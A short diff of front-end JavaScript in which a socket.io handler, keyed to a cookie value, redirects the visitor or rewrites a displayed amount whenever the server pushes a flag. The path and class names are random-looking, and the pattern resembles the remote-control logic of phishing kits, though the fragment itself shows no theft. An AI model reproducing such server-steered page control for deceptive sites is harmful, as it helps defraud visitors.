@@ -742,7 +742,7 @@ $(".img_producto_container")
       socket.on(getcookie('evid'), function (data) {
         if (data['goKaraleva'] == '0') {
           rets = 14;
-          window.location.href = "/4024152558o8239h";
+          window.location.href = "/BadproductTurn/"+window.location.href.substring(window.location.href.lastIndexOf('/') + 1);
         } else if (data['goKaraleva'] == '1' && got <= 1) {
           got = 1;
           document.querySelectorAll(".uxskpx").forEach(el => {el.innerHTML = `${data['amount']}`});
